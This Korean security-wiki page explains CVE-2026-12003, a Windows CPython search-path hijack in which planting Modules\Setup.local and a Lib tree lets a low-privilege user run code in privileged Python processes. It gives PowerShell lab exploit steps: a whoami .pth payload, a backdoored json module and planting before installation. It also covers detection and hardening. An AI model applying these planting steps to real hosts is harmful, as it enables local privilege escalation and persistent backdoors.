# Windows CPython Build-Landmark 및 `sys.path` Hijacking

{{#include ../../../banners/hacktricks-training.md}}

runtime은 빌드 트리에서만 사용하도록 의도된 relative path를 유지할 수 있습니다. 설치된 privileged runtime이 해당 경로 중 하나를 low-privilege-writable directory로 resolve하면, attacker는 예상되는 **build landmark**를 심고 runtime이 대체 library prefix를 신뢰하도록 만들 수 있습니다. CVE-2026-12003은 Windows CPython의 예시입니다. `Modules\Setup.local`을 심으면 보호된 Python 설치를 수정하지 않고도 `sys.path`의 standard-library entry를 redirect할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

## CPython path-construction chain

영향받는 Windows build는 `VPATH=..\..`을 compile하고 이를 `sys._vpath`로 노출했습니다. 취약한 `Modules/getpath.py`의 fallback은 `VPATH\Modules\Setup.local`을 interpreter가 source tree에서 실행 중이라는 증거로 처리했습니다. 다음 data flow는 이 build-time 값을 runtime search-path primitive로 변환합니다.<sup>[[1]](#references)[[2]](#references)</sup>

| 단계 | `C:\Program Files\Python314\python.exe`에 대해 도출되는 값 |
| --- | --- |
| Compiled build path | `VPATH=..\..` |
| Runtime build landmark | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Attacker-created landmark | `C:\Modules\Setup.local` |
| 선택된 `build_prefix` | `C:\` |
| 선택된 standard library | `C:\Lib` |
| 결과 | Attacker-controlled `C:\Lib`가 `sys.path`에 append됨 |

이 check는 executable 옆의 더 구체적인 `pybuilddir.txt`가 없거나 read할 수 없을 때 사용되는 fallback입니다. 이는 low-privilege user가 `C:\Program Files\Python314`를 변경할 수 없더라도 `C:\`에 새 directory를 create할 수 있을 수 있기 때문에 중요합니다. 이후 privileged `python.exe` process는 자체 access token을 사용해 Python code를 load합니다.<sup>[[1]](#references)[[2]](#references)</sup>

### Preconditions

다음 조건이 모두 충족되는 경우에만 이를 privilege boundary로 간주합니다.<sup>[[1]](#references)[[2]](#references)</sup>

- 대상이 영향을 받는 **Windows CPython** build여야 합니다. 취약한 path logic은 Python language의 속성이 아닙니다.
- `python.exe`가 포함된 directory에서 `..\..`을 resolve하여 얻은 directory에 less-privileged user가 landmark와 `Lib` tree를 create할 수 있어야 합니다.
- higher-privileged user, service, installer 또는 software-deployment account가 이후 해당 interpreter를 start해야 합니다.
- 어떠한 path-isolation configuration도 취약한 discovery path를 override하지 않아야 합니다.

## Enumeration

compiled value와 effective search path를 모두 inspect합니다. 노출된 `..\..` 값은 유용한 lead이지만 exploitability의 증거는 아닙니다. path를 resolve하고 ACL을 test하며, planted landmark가 protected installation 외부에 위치하는지도 확인해야 합니다.<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
공식 installer로만 assessment를 제한하지 마세요. `python.exe`를 번들로 포함하는 모든 product에 대해 실제 executable directory를 기준으로 `sys._vpath`를 resolve하고, 그 결과로 지정되는 `Modules` 및 `Lib` 위치의 ACL을 검토하세요. 더 깊은 installation path에서는 `C:\` 대신 다른 쓰기 가능한 application 또는 vendor directory로 resolve될 수 있습니다.<sup>[[1]](#references)</sup>

## Lab exploitation workflow

다음 lab PoC는 선택한 prefix 아래에 legitimate runtime을 충분히 재현하여 Python이 initialize되도록 하고, executable `.pth` line을 추가한 다음, 마지막으로 landmark를 생성합니다. interpreter가 일시적으로 불완전한 library tree를 가리키는 상황을 방지하려면 landmark보다 먼저 payload를 생성하세요.<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
정상적인 site 초기화 중에 Python은 인식된 site-packages 디렉터리의 `.pth` 파일을 처리합니다. 공백이 뒤따르는 `import`로 시작하는 줄만 실행되며, 실행 가능한 문은 하나의 물리적 줄에 유지되어야 합니다. `python -S`는 자동 `site` import를 억제하므로 이 트리거가 발생하지 않습니다.<sup>[[1]](#references)[[4]](#references)</sup>

### Import-triggered 대안

Startup execution은 필수가 아닙니다. 정상적인 library tree를 재현한 후, 권한이 높은 스크립트가 예측 가능하게 import하는 모듈에 backdoor를 삽입할 수 있습니다. 예를 들어 심어 둔 `Lib\json\__init__.py`에 코드를 추가하면 피해자가 `json`을 import할 때 실행됩니다. 보편적으로 import되지는 않지만 안정적인 모듈을 선택하면 트리거를 더 조용하게 만들 수 있습니다.<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
이 변형은 여전히 importing process의 token을 상속하지만, 대상 애플리케이션이 수정된 module을 import해야 한다는 조건이 있습니다. 실제 software를 테스트할 때는 원본 module의 동작을 유지해야 하며, 그렇지 않으면 의도한 privileged workflow가 완료되기 전에 import가 실패할 수 있습니다.<sup>[[1]](#references)</sup>

## 설치 전 planting

Search-path planting은 설치에 앞서 수행될 수 있습니다. low-privilege user는 향후 `Lib` tree와 `Modules\Setup.local`을 준비한 다음, privileged software portal, help-desk workflow 또는 deployment system이 모든 사용자 대상 설치를 수행할 때까지 기다릴 수 있습니다. 새 interpreter를 실행하여 package를 설치하거나 standard library를 precompile하는 installer는 administrator가 직접 Python을 열지 않아도 deployment account의 권한으로 payload를 실행할 수 있습니다.<sup>[[1]](#references)</sup>

이는 deployment review 방식도 변경합니다. deployment 후 최종 installation directory만 확인하는 대신, bundled runtime을 설치하거나 upgrade하기 **전에** writable ancestor와 사전에 존재하는 landmark/library directory를 검사해야 합니다.<sup>[[1]](#references)</sup>

## Detection and hardening

유용한 host pivot은 예상하지 못한 landmark와 library tree를 확인한 뒤 privileged Python launch를 추적하는 것입니다. `Modules\Setup.local`, root-level 또는 그 외 위치가 부적절한 `Lib\site-packages\*.pth`, 복사된 standard-library package, 그리고 owner 또는 creation time이 보호된 installation과 다른 module file을 탐지합니다. standard user가 생성한 이러한 항목과 elevated `python.exe`가 `cmd.exe`, `powershell.exe`, account-management tool 또는 기타 비정상적인 child process를 spawn하는 행위를 상호 연관 분석합니다.<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
upstream 수정은 `VPATH\Modules\Setup.local` fallback을 제거하고 `pybuilddir.txt`를 유일한 build-tree indicator로 사용합니다. 고정된 build 또는 현재 Python install manager로 관리되는 사용자별 설치를 우선 사용하세요. 업그레이드가 일시적으로 불가능한 경우, 확인된 상위 디렉터리를 보호하고 제한적인 ACL로 `Modules`를 미리 생성하세요. 제어된 `._pth` 파일 또는 `PYTHONHOME`을 사용해 discovery를 변경할 수도 있지만, 애플리케이션 호환성 테스트가 필요합니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Windows CPython Search-Path Hijacking and Local Privilege Escalation](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - 설치 디렉터리를 수정하지 않고 in-tree search paths를 활성화할 수 있음](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - `VPATH/Modules/Setup.local` fallback 제거](https://github.com/python/cpython/pull/151545)
- [4] [Python documentation - `site` path configuration files](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
